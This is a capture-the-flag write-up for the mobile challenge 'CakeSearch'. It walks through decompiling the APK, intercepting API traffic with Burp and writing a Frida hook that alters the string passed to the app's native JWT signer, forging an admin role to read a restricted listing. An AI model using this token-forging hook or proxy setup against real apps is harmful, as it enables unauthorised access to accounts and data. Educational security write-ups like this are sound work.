+++
title = "Brunnerctf26 - CakeSearch"
date = "2026-08-27"
weight = 0

[taxonomies]
tags=[
    "web", "mobile", "crypto", 
    "ctf", 
]
ctf=["brunnerctf26"]
+++

# Let the Corp. commence

CakeSearch is a mobile challenge from brunnerctf26 with an aspect of web to it. The challenge is all around the journey of applying to our dream job and getting the flag to prove it!

There's a handout with a single APK file: `CakeSearch.apk`.

The first thing we are greeted with is a login/registration page. After registering and logging in we see a board for job positions. We can also press on an entry to see the details of the position.

<img
    src="/imgs/ctf/brunner26-mobile/pasted-image-20260827123811.png"
    alt="CakeSearch application screen"
    style="width: 400px; max-width: 50%; height: auto;">
<img
    src="/imgs/ctf/brunner26-mobile/pasted-image-20260827123827.png"
    alt="CakeSearch application screen"
    style="width: 400px; max-width: 50%; height: auto;">



HMMMM...


![CakeSearch application animation](/imgs/ctf/brunner26-mobile/ezgif-349ec5afd46d2f1c.gif)

That's suspicious! What is this secret job? And where does this filtering of positions happen? Client-side?

Let's have a closer look at the source code.

# Static Analysis

For conducting the static analysis, I fired up JADX.

{% <note clickable={true} hidden={false} header="Analysis note"> %}
In the analysis below I have already have renamed some classes and variables. Most of these new names can be derived from context e.g. other function calls, `toString()` implementations. Otherwise human reasoning was used. I've omitted the documentation of renaming in the name of clarity.

{% </note> %}

As you can see that we have three _Activities_, and a `crypto` package

![CakeSearch application output](/imgs/ctf/brunner26-mobile/pasted-image-20260826001624.png)

The activities correspond to what we can do in the app, namely: Create an account, login on the platform, and lastly see the positions and their details.

> The `crypto` package is actually where it gets juicy, but let's not get ahead of ourselves!

Looking at `PositionsActivity`, we can see that the filtering of the positions does not happen here.

```java
public final class PositionsActivity extends AbstractActivityC0784w2 {  
    [....]
    public final void onCreate(Bundle bundle) {  
	[....]
        WebSettings settings = webView.getSettings();  
        settings.setJavaScriptEnabled(true);  
	[....]
        webView.addJavascriptInterface(new CakeBridge(session, new TokenSigner()), "CakeBridge");  
        [....]
        webView.loadUrl("https://cakesearch.challs.brunnerne.xyz:31000//positions");  
        m7g().m10a(this, new C0595qn(webView, this));  
    }  
}
```

However, we can see that it uses a JavaScript bridge: `CakeBridge`. This bridge allows the codebase of the app (Java or most likely Kotlin) to interact with JavaScript on the respective page, and vice versa. Thus, the filtering logic must be found in a JavaScript file that is loaded by the page. 

```bash
$ curl https://cakesearch.challs.brunnerne.xyz:31000/ -k -s | grep script
<script src="/static/portal.js"></script>
```

In the `/static/portal.js` file we can see that some `internal` positions are only rendered for admins:
```js
function renderFeed() {
	detail.classList.remove("on");
	detail.innerHTML = "";
	feed.style.display = "";
	tally.style.display = "";

	// Internal requisitions are for staff only.
	var visible = positions.filter(function (p) {
		return p.visibility !== "internal" || viewer.role === "admin";
	});

	feed.innerHTML = visible.map(cardHtml).join("");

	// The only place the discrepancy is visible on screen.
	tally.textContent =
		"Showing " + visible.length + " of " + total + " open positions";

	Array.prototype.forEach.call(feed.querySelectorAll(".card"), function (card) {
		card.addEventListener("click", function () {
			location.hash = "#/position/" + card.getAttribute("data-id");
		});
	});
}
```

![CakeSearch role editing animation](/imgs/ctf/brunner26-mobile/ezgif-role-edit.gif)

Furthermore when writing this write-up I also noticed the verbosity of these comments:
```js
var positions = null; // records from the last /api/positions call
var total = 0; // what the server SAYS it has - the stage-1 leak
```
and this comment for the decryption:
```js
// Detail payloads arrive sealed (AES-256-GCM). The key lives in
// libcakesearch.so, so only the native side can open them - we ask it to.
function unseal(blob) {
	if (typeof CakeBridge !== "undefined" && CakeBridge.decrypt) {
		return CakeBridge.decrypt(blob);
	}
	return "";
}
```

This means that the JavaScript invokes the decrypt method from the app through the `CakeBridge` to decrypt the details of the positions, which then is displayed on the device. More importantly it means that the key is in the app, and not on the backend where it belongs!

> Also, the native library `libcakesearch.so` is used in the `TokenSigner` class, which we will exploit later.

This also means that if we do a simple request with a valid token, the API will return just the ciphertext:
```bash
$ curl https://cakesearch.challs.brunnerne.xyz:31000/api/positions/201/details -k \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzbWF2bDEzMzdAc21hdmwucm9ja3MiLCJ1aWQiOjYsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzg3ODM4MDMxLCJpYXQiOjE3ODc4MzA4MzF9.BBeOR7Vyj-3m6eB07V68gmwdSKGvckvMqzAEg-bL408"  -s | jq . ; echo
```
```json
{
  "alg": "A256GCM",
  "enc": "OQafMWKJOTwgrTJAXEj6dva2cAjmv/31EiGvpyn5aV8LuRjZyLXwcwknJcBzOdjlceDQkWhbUs6yPI2r1G+lulAUyipyyuOBtxNLss0MHeV1+pZBdhwBqwsSn7CABgx2f+niWPmKLZZDhCO6fnU9M5AlrgkVfdzq1bNvI9DDnF2DAxZejQ5XJYheqJBDeom82+1bv5g7Cp+UtG/pvGtbbxzsFL9JZCO5uezOocnaCkKs2Pdp7on3fR9wUQefRi/uKOCb3355oXEeLtl682E9LEAZ8M0R98fJybxJIYJslhLTatfnh2/46gr8pEtyH0rJOqP21JF/8KLZHbCbaCepsyD2jLURx7nXRgR+LFHQbKwUgHtYLyiuFmtvzJHGVPYL9zEzgL+vAk3vOOXDRAFO0dZaVAwU7Mz5NGrVv/H0hV85WfTTR62g7OdjIlkq0/ybZqT9Vd1QGD/0HSlDOABDS1SgHzbkJGIC+hT+8oCLI9K/D8ICMQU7wkZyJf7eZLwHDULyuufxInOLl3YpawEKRu7/4N6ZFekP9KylYH/8gRu0vbG4/6F9xiXJmdV9yu2rVdp+QsHJ+Z+fj2fho//nmc5SLXvu4+FSATcYZFUW36MW7FiPrn8hVKvfruvPLmZFrN3fB/lvLtirb1Sfju+WMLxvI42W00CMbajLt6fKdiIOPc0KCWfrn7V15Wpz+8aTP2Z5wjOwbKI6i6DH0JAO0PZdlFyXjwchE+Nz/hwoVLqJGgapsWPYKN51xac4UrsLnbD0S89Re7oVmSYCIWwr42xPYG58xuuuvewreTVy/bx6tBEafAS1egRKRnZiG1foVFNpad3NXesC7cw1bdYECweYw2d8VbpvaPiExpD6iBB06SE63GybsKGbV9Hv0pzQjC5yjJkxDFNIKg3dsO8oTdmUNDqukQkWiL7QjcqhRe8rtGLrFqNZ7/klOzM50CXZ2TZxL0GncWHuwNt0sEcoDwKfbLYhnDZtkJkc7J4PVVkivXf4Sxeu6lYq5yq4Tv8f1K5gZoY+NphafcUJ+hvzsZREwFx7+RN8zH8J1LN6FOBN8lWLU/5GNkGuiFb/waD9EQog1OYvr4JC9TquTCfmhV1bkVy2omOImpBgzY3Ec8TaejkbTro4LF/twZPHKQ/min8SnKiyp+Whi8vvs32O/EhtLOnXRxJrePYBNjWpA5KbuDgNfXGjLmidLsWVEpibswL3NT7WYQ4PC1KS0/9CciJru9ODttKobuv34X80Z1BkB3qzpSYK9P/B0w89WSfD8rv8hthIAEfntbZn3RROBid4z95iycLyEfGs9plw5OBoMBYdFkB1axw5DVsPNaHs5inc2s0O4U4NuCqeMluxW6sneU6Lb0JxDK32ecnWAZd7FbpwScj2FSxjK7kUn3vxaXP0KwcPgAQxcSkIpEk5QEWdVX4S4UE9saq3EU3l/DDmEFo6Y7CopTyEBsH1Hmd7JQWBbdknRvl4vLeikUi6oebByuY+tfwr5lriVN1Jo2L7QVbT1639HIBkXgIEzkyfTPhnImIGBcTCcYWYFTaLZbtdD1rT/9AIY9gf/Ctdv0EiqtfV3bgKpfivAhhbOJOj8u6759tTZfEa"
}
```

{% <note clickable={true} hidden={true} header="How did you get the token?"> %}
For obtaining the token I time travelled into the future, to the moment where i had sat up my proxy. More about that later!

{% </note> %}

Looking closer at `CakeBridge` on the Android side of things, we see some of the methods that can be invoked. This is due to the annotation: `@JavascriptInterface`

```java
package p000b;  
  
import android.util.Log;  
import android.webkit.JavascriptInterface;  
import dk.brunnerne.cakesearch.crypto.TokenSigner;  

public final class CakeBridge {  
  
    public final Session session;  
  
    public final TokenSigner tokenSigner;  
  
    public final C0325j0 f1060c;  
  
    public CakeBridge(Session session, TokenSigner tokenSigner) {  
        session.getClass();  
        tokenSigner.getClass();  
        this.session = session;  
        this.tokenSigner = tokenSigner;  
        this.f1060c = new C0325j0(8, tokenSigner);  
    }  
  
    @JavascriptInterface  
    public final String decrypt(String str) {  
        str.getClass();  
        try {  
            return this.f1060c.decrypt(str);  
        } catch (Exception e) {  
            Log.w("CakeSearch", "Could not unseal a requisition payload", e);  
            return "";  
        }  
    }  
	
    [....]
  
    @JavascriptInterface  
    public final String getToken() {  
        String strSign = this.tokenSigner.sign(this.session);  
        return strSign == null ? "" : strSign;  
    }  
	
    [....]
  
}
```

The decrypt method is the sole reason that when we click a position, we can actually read the contents on the app.

# Eyeing the corporate dream

Before we try to decrypt the world, I want to bypass the client-side filtering.

As we can see below the script calls `load()` when run. Thus, `/api/positions` is likely to include the positions unfiltered!

```js
    [....]
    async function load() {
	    var res;
	    try {
		    res = await api("/api/positions");
	    } catch (e) {
		    [....]
	    }
	    [....]
	    
	    var data = await res.json();
	    positions = data.positions;
	    [....]
    }

    window.addEventListener("hashchange", route);
    load();
})();
```

At this point we could start to analyze `dk.brunnerne.cakesearch.crypto`and its methods. However, I will save that for later and look at the request through a proxy.

---

Figuring out how to setup a proxy is an exercise left to the reader, however i will distribute these lines of xml to you:

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="false">10.0.2.2
        </domain>
    </domain-config>
</network-security-config>
```

---

Having the proxy up, we can refresh by pulling up in the app, and watch the request arrive in _Burp_

```json
{
  "positions":[
    {
      "employment_type":"Full time",
      "id":201,
      "is_new":true,
      "location":"Copenhagen (hybrid, 4 days on-site)",
      "logo_bg":"#2E6BD6",
      "logo_text":"BF",
      "posted":"2 d",
      "summary":"Are you passionate about frosting? Brunnerne A/S is scaling up and we need a self-starter to own the buttercream vertical end-to-end. You will synergise with stakeholders across the sprinkle value chain.",
      "team":"Buttercream Delivery",
      "title":"Junior Frosting Technician",
      "visibility":"public"
    },
    [...]
    {
      "employment_type":"Full time",
      "id":1337,
      "is_new":false,
      "location":"Top floor. You will not be told which building.",
      "logo_bg":"#46291A",
      "logo_text":"CCO",
      "posted":"3 w",
      "summary":"RESTRICTED REQUISITION - BOARD EYES ONLY. Compensation band, equity allocation and reporting line withheld from the public listing. Authorised staff may retrieve the full record at /api/positions/1337/details.",
      "team":"Executive Board",
      "title":"Chief Cake Officer (CCO)",
      "visibility":"internal"
    }
  ],
  "total":4,
  "viewer":{
    "role":"user",
    "sub":"smavl1337@smavl.rocks"
  }
}

```


```json
"summary": "RESTRICTED [...] may retrieve the full record at /api/positions/1337/details.",
```

With the token intercepted with burp we can try to fetch the details.

```bash
$ curl https://cakesearch.challs.brunnerne.xyz:31000/api/positions/1337/details -k \
    -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzbWF2bDEzMzdAc21hdmwucm9ja3MiLCJ1aWQiOjYsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzg3ODQ3NjA3LCJpYXQiOjE3ODc4NDA0MDd9.XXEp4cNxgixDJ95TLiOFJZr1oCnSOMECo8TSTUi1Gng'
```

```json
{
	"error":"Insufficient privileges. This requisition is restricted to authorised Brunnerne A/S staff.",
	"your_role":"user"
}
```
![CakeSearch role animation](/imgs/ctf/brunner26-mobile/giphy-role.gif)

# Applying for the dream job

To get the details of our dream job, we want to change our role, meaning we need to forge our JWT.

Taking a look at the `TokenSigner` class:
```java
package dk.brunnerne.cakesearch.crypto;  
[....] 
public final class TokenSigner {  
    static {  
        System.loadLibrary("cakesearch");  
    }  
  
    private final native byte[] nativeContentKey();  
  
    private final native String nativeSign(String str);  
  
    /* JADX INFO: renamed from: a */  
    public final byte[] init() {  
        byte[] bArrNativeContentKey = nativeContentKey();  
        if (bArrNativeContentKey != null) {  
            return bArrNativeContentKey;  
        }  
        C0048b7.m204j("content key unavailable");  
        return null;  
    }  
  
    /* JADX INFO: renamed from: b */  
    public final String sign(Session session) {  
        long jCurrentTimeMillis = System.currentTimeMillis() / 1000;  
        hashmap_ hashmap_Var = new hashmap_();  
        hashmap_Var.add_jwt_entry(session.email, "sub");  
        hashmap_Var.add_jwt_entry(Integer.valueOf(session.uid), "uid");  
        hashmap_Var.add_jwt_entry("user", "role");  
        hashmap_Var.add_jwt_entry(Long.valueOf(jCurrentTimeMillis), "iat");  
        hashmap_Var.add_jwt_entry(Long.valueOf((((long) session.ttl) * 60) + jCurrentTimeMillis), "exp");  
        String string = hashmap_Var.toString();  
        string.getClass();  
        return nativeSign(string);  
    }  
}
```

As we saw earlier the `TokenSigner` was passed into the constructor of the `CakeBridge`

And if we decode the auth token we can see that this corresponds with the `sign()` method:
```bash
$ base64 -i -d <<< "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzbWF2bDEzMzdAc21hdmwucm9ja3MiLCJ1aWQiOjYsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzg3ODQ3NjA3LCJpYXQiOjE3ODc4NDA0MDd9.XXEp4cNxgixDJ95TLiOFJZr1oCnSOMECo8TSTUi1Gng" | jq . 2>/dev/null
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "smavl1337@smavl.rocks",
  "uid": 6,
  "role": "user",
  "exp": 1787847607,
  "iat": 1787840407
}
```

At this point we could throw `libcakesearch.so` into IDA and extract the key, however The Rock does not concern himself with the likes of `IDA` when he can instrument with `frida`.


First we can try to hook the sign method with:
```js
Java.performNow(function(){
    var TokenSigner = Java.use("dk.brunnerne.cakesearch.crypto.TokenSigner");
    console.log(`tokenSigner class found ${TokenSigner}`)

    // hook function
    var TokenSigner = Java.use("dk.brunnerne.cakesearch.crypto.TokenSigner");
    TokenSigner["nativeSign"].implementation = function (str) {
        console.log(`TokenSigner.nativeSign is called: str=${str}`);
        return this["nativeSign"](str);
    };
})
```
This will print the string that gets signed.

Then run `frida` while the app is running, and refresh the page to trigger the `sign()` method.
```bash
$ frida -U -n CakeSearch -l exp.js
[....]
tokenSigner class found <class: dk.brunnerne.cakesearch.crypto.TokenSigner>
[GM1901::CakeSearch ]-> TokenSigner.nativeSign is called: str={"sub":"smavl1337@smavl.rocks","uid":6,"role":"user","exp":1787851370,"iat":1787844170}
```

Now we only need to replace `"role":"user"` with `"role":"admin"` before signing the string.


We can do this by changing the string passed into the method:
```js
Java.performNow(function(){
    var TokenSigner = Java.use("dk.brunnerne.cakesearch.crypto.TokenSigner");
    console.log(`tokenSigner class found ${TokenSigner}`)

    // hook function
    var TokenSigner = Java.use("dk.brunnerne.cakesearch.crypto.TokenSigner");
    TokenSigner["nativeSign"].implementation = function (str) {
        console.log(`TokenSigner.nativeSign is called: str=${str}`);
        // change role to admin
        var forge = str.replace("user","admin");
        return this["nativeSign"](forge);
    };
})
```

Now, when we refresh, we can see the position and find the flag under the details!

<img src="/imgs/ctf/brunner26-mobile/Screenshot_20260827-163613_CakeSearch.png" alt="CakeSearch role editing animation" style="width: 400px; max-width: 100%; height: auto;">
<img src="/imgs/ctf/brunner26-mobile/Screenshot_20260827-163624_CakeSearch.png" alt="CakeSearch role editing animation" style="width: 400px; max-width: 100%; height: auto;">

Finally, we can chase our corporate dream and subject ourselves to numerous delightful interview rounds.

![yap](/imgs/ctf/brunner26-mobile/ezgif.com-added-text.gif) 
